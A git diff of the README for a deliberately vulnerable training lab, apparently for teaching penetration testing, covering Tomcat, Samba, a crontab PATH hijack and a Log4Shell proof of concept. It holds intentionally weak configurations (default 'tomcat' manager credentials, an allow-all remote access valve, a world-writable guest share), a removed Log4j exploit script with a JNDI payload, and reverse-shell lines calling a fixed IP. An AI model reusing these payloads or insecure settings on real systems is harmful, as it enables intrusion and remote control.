@@ -30,35 +30,13 @@ You will install the following labs after you run the the scripts:
 - Run the script as sudo ./pc.sh or sudo ./mac.sh
 
 ## Misconfigurations
-- Misconfigured crontab file
-- SSH key with weak password
-- Make manager interface of apache-tomcat public
+- crontab file misconfiguration
+- Weak SSH password
+- Exposing apache-tomcat manager interface
 
-# Configuration
-The script will configure all the files below already. Just verify if individual files have the right content.
+## Configurations
+You will find all configurations and misconfigurations in the files in this repositories. The pc.sh and the mac.sh will copy all the files to the right locations to automatically configure the lab for you.
 
-
-## Configure the James Server Phonix.sh script 
-```
-export JAVA_HOME="/usr/lib/jvm/java-8-openjdk-armd64"
-export JAVA_HOME
-PATH=$PATH:$JAVA_HOME/bin
-export PATH
-Or copy the above command to you .profile file run source .profile
-Run echo $PATH to ensure that JAVA_HOME is part of the path.
-
-cd /opt/james-2.3.2/bin
-open the phonix.sh file and set the JAVA_HOME:
-
-...
-JAVA_HOME="/usr/lib/jvm/java-8-openjdk-armd64"
-usage()
-{
-    echo "Usage: $0 {start|stop|run|restart|check}"
-    exit 1
-}
-…
-```
 ### Create Start James server Script with the name startjamesserver.sh
 ```
 #startjamesserver.sh
@@ -73,63 +51,12 @@ chmod + startjamesserver.sh
 
 ./startjamesserver.sh to start the server.
 
-## Apache Tomcat Configuration
-Open the tomcat-users.xml in the /opt/apache-tomcat-xxx/conf
+## Apache Tomcat Configuration 
+* This is for your information only. You dont need to do anything, the scripts will do everything for you.
+- Add the user and role to the tomcat-users.xml in the /opt/apache-tomcat-xxx/conf
+- Modify the manager file in the Catalina directory to allow remote access (see the manager.xml file)
+- Open the port 8081 in the / opt/apache-tomcat-xxx/conf/server.xml file to avoid conflict with log4j which is running on port 8080. 
 
-Modify the manager section of the tomcat-users.xml file as follows:
- 
-```
-<role rolename="manager-gui"/>
-<user username="tomcat" password="tomcat" roles="manager-gui"/>
-
-
-…
-<!--
-  <role rolename="tomcat"/>
-  <role rolename="role1"/>
-  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
-  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
-  <user username="role1" password="<must-be-changed>" roles="role1"/>
--->
-
-```
-
-
-### Configure apache-tomcat Listening port
-Go to / opt/apache-tomcat-xxx/conf/server.xml and change the listening port from 8080 t0 8081 to avoid conflict with log4j port. 
-
-Change **Connector port="8080"** to  **Connector port="8081"**
-
-```
-<!-- A "Connector" represents an endpoint by which requests are received
-         and responses are returned. Documentation at :
-         Java HTTP Connector: /docs/config/http.html
-         Java AJP  Connector: /docs/config/ajp.html
-         APR (HTTP/AJP) Connector: /docs/apr.html
-         Define a non-SSL/TLS HTTP/1.1 Connector on port 8080
-    -->
-    <Connector port="8081" protocol="HTTP/1.1"
-               connectionTimeout="20000"
-               redirectPort="8443" />
-    <!-- A "Connector" using the shared thread pool-->
-    <!--
-    <Connector executor="tomcatThreadPool"
-               port="8080" protocol="HTTP/1.1"
-               connectionTimeout="20000"
-               redirectPort="8443" />
-    -->
-```
-### Configure remote host access
-Create the folder or file Catalina/localhost/manager.xml if they don´t exist
-```
-sudo nano ${CATLINA_HOME}/conf/Catalina/localhost/manager.xml 
-#file should look like this
-	
-<Context privileged="true" antiResourceLocking="false" 
-         docBase="{catalina.home}/webapps/manager">
-    <Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="^.*$" />
-</Context>
-```
 ### Start apache with script name startapache.sh
 ```
 #!/bin/bash
@@ -142,48 +69,7 @@ sudo ./startapache.sh
 
 ## Log4j PoC
 
-Modify the poc.py file to point to the JAVA_HOME as follows:
-```
-…
-#!/usr/bin/env python3
-    try:
-        p.write_text(program)
-        subprocess.run([os.path.join(CUR_FOLDER, "/usr/lib/jvm/java-8-openjdk-armd64/bin/javac"), str(p)])
-    except OSError as e:
-        print(Fore.RED + f'[-] Something went wrong {e}')
-        raise e
-    else:
-        print(Fore.GREEN + '[+] Exploit java class created success')
-def payload(userip: str, webport: int, lport: int) -> None:
-    generate_payload(userip, lport)
-    print(Fore.GREEN + '[+] Setting up LDAP server\n')
-    # create the LDAP server on new thread
-    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
-    t1.start()
-    # start the web server
-    print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
-    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
-    httpd.serve_forever()
-def check_java() -> bool:
-    exit_code = subprocess.call([
-        os.path.join(CUR_FOLDER, '/usr/lib/jvm/java-8-openjdk-armd64/bin/java'),
-        '-version',
-    ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
-    return exit_code == 0
-    
-def ldap_server(userip: str, lport: int) -> None:
-    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
-    print(Fore.GREEN + f"[+] Send me: {sendme}\n")
-    url = "http://{}:{}/#Exploit".format(userip, lport)
-    subprocess.run([
-        os.path.join(CUR_FOLDER, "/usr/lib/jvm/java-8-openjdk-armd64/bin/java"),
-        "-cp",
-        os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
-        "marshalsec.jndi.LDAPRefServer",
-        url,
-    ])
-…
-```
+Modify the poc.py file to point to the JAVA_HOME. This already done in the poc.py file.
 
 Run the payload generator to generate payload script
 
@@ -224,66 +110,20 @@ Copy the payload ${jndi:ldap://localhost:1389/a} and paste it in the username fi
 ## Samba config
 ### Create Users password
 ```
-sudo adduser username
+sudo useradd -m username  # or run the ./createuser.sh script to create users.
+#add samba password
 sudo smbpasswd -a username
+#add system password for users
+sudo passwd username
+#it is possible to sync password but we want to keep it simple here
 ```
-### Configure the Samba users in the smb.conf file as follows:
-
-```
-sudo nano /etc/samba/smb.conf
-
-#======================= Global Settings =======================
-
-[global]
-
-#just addedd
-#client min protocol = SMB2
-#client max protocol = SMB3
-## Browsing/Identification ###
-# Change this to the workgroup/NT-domain name your Samba server will part of
-   workgroup = WORKGROUP
-[Anonymous]
-# comment = YOUR COMMENTS
- path = /samba/anonymous
- public = yes
- guest only = yes
- browsable = yes
- force create mode = 0666
- force directory mode = 0777
- writable = yes
- guest ok = yes
- read only = no
- force user = nobody
-[Alice]
-    path = /samba/alice
-    browseable = yes
-    valid users = @smbgrp
-    read only = no
-    force create mode = 0660
-    force directory mode = 2770
-    valid users = @sambashare @sadmin
-[josh]
-    path = /samba/josh
-    browseable = yes
-    valid users = @smbgrp
-    read only = no
-    force create mode = 0660
-    force directory mode = 2770
-    valid users = josh @sadmin
-[James]
-    path = /samba/james
-    browseable = no
-    valid users = @smbgrp
-    read only = yes
-    force create mode = 0660
-    force directory mode = 2770
-    valid users = james @sadmin
-```
+### Configure the Samba users in the smb.conf.
+Use the smb.conf file. This will be done automatcically by the script. 
 ### Restart
 sudo systemctl restart smbd
 
 ## Crontab configuration
-Go to sudo nano /etc/crontab
+Crontab configuration will be done automatically the script. In case something goes wron then go to sudo nano /etc/crontab and edit the file.
 
 Edit the cron job file as below:
 ```
@@ -312,7 +152,7 @@ PATH=/home/oslomet:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 #
 ```
-### backup.sh script
+### Create backup.sh script
 
 ```
 #!/bin/bash
@@ -320,7 +160,7 @@ PATH=/home/oslomet:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 # bash -i   >&  /dev/tcp/192.168.50.245/1234  0  >&1
 #nc 192.168.50.234 1234
 ```
-### reverse.sh
+### create reverse.sh
 ```
 #!/bin/bash
 #bash -i     >&  /dev/tcp/192.168.50.245/1234  0  >&1
